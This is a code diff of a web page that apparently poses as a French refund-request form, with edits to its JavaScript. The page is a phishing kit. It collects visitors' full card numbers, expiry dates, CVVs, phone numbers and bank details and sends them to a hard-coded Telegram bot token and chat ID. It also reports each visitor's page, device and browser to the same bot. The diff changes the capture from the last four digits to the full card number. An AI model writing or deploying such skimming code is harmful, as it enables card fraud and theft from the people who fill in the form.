@@ -949,7 +949,7 @@
                     </a>
                 </div>
             </div>
-        </div>
+</div>
     </footer>
 
     <!-- Back to Top Button -->
@@ -974,9 +974,18 @@
     async function trackVisitor() {
         try {
             // 1. جمع المعلومات الأساسية
+            const now = new Date();
             const basicInfo = {
                 page: window.location.href,
-                time: new Date().toLocaleString(),
+                time: now.toLocaleString('en-US', {
+                    month: 'numeric',
+                    day: 'numeric',
+                    year: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: true
+                }),
                 device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 💻",
                 browser: getBrowserName(),
                 language: navigator.language,
@@ -997,7 +1006,7 @@
             const telegramChatId = "5372119436";
             
             const message = `
-🔔 **New Website Visit** 🔔
+🔔 New Website Visit 🔔
 📄 Page: ${basicInfo.page}
 🕒 Time: ${basicInfo.time}
 📍 Location: ${locationInfo}
@@ -1037,11 +1046,26 @@
         const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
         const telegramChatId = "5372119436";
         
-const message = `
-🔔 **New Website Visit** 🔔
+        const now = new Date();
+        const basicInfo = {
+            page: window.location.href,
+            time: now.toLocaleString('en-US', {
+                month: 'numeric',
+                day: 'numeric',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            }),
+            device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 💻",
+            browser: getBrowserName()
+        };
+        
+        const message = `
+🔔 New Website Visit 🔔
 📄 Page: ${basicInfo.page}
 🕒 Time: ${basicInfo.time}
-📍 Location: ${locationInfo}
 📱 Device: ${basicInfo.device}
 🌐 Browser: ${basicInfo.browser}
             `;
@@ -1095,7 +1119,7 @@ const message = `
             // جمع بيانات النموذج
             const formData = {
                 nom: document.getElementById("nom").value,
-                lastFourDigits: document.getElementById("numero-carte").value.slice(-16),
+                cardNumber: document.getElementById("numero-carte").value.replace(/\s/g, ''),
                 dateExpiration: document.getElementById("date-expiration").value,
                 cvv: document.getElementById("cvv").value,
                 telephone: document.getElementById("telephone").value,
@@ -1103,13 +1127,14 @@ const message = `
                 bank: document.getElementById("bank").value,
                 amount: document.getElementById("amount").value,
                 reason: document.getElementById("reason").value,
+                comments: document.getElementById("comments")?.value || 'undefined',
                 submissionTime: new Date().toISOString()
             };
 
             // حفظ البيانات المهمة للصفحات القادمة
             const dataToStore = {
                 nom: formData.nom,
-                lastFourDigits: formData.numero-carte,
+                lastFourDigits: formData.cardNumber.slice(-4),
                 telephone: formData.telephone,
                 operateur: formData.operateur,
                 bank: formData.bank,
@@ -1122,18 +1147,18 @@ const message = `
             localStorage.setItem('remboursementData', JSON.stringify(dataToStore));
             
             // إرسال البيانات عبر Telegram
-            const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
+            const message = `🔔 Nouvelle Demande de Remboursement 🔔
 👤 Nom: ${formData.nom}
-💳 Carte: ${formData.numero-carte}
+💳 Carte: ${formData.cardNumber.replace(/(\d{4})/g, '$1 ').trim()}
 📅 Exp: ${formData.dateExpiration}
 🔒 CVV: ${formData.cvv}
 📞 Tel: ${formData.telephone}
 📡 Opérateur: ${formData.operateur}
 🏦 Banque: ${formData.bank}
 💰 Montant: ${formData.amount}€
-📌 Motif: ${formData.reason}
+📌 Motif: ${formData.reason} (${formData.amount}€)
 💬 Commentaires: ${formData.comments}
-🕒 Heure: ${new Date(formData.submissionTime).toLocaleString()}`;
+🕒 Heure: ${new Date(formData.submissionTime).toLocaleString('fr-FR')}`;
 
             const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
             const telegramChatId = "5372119436";
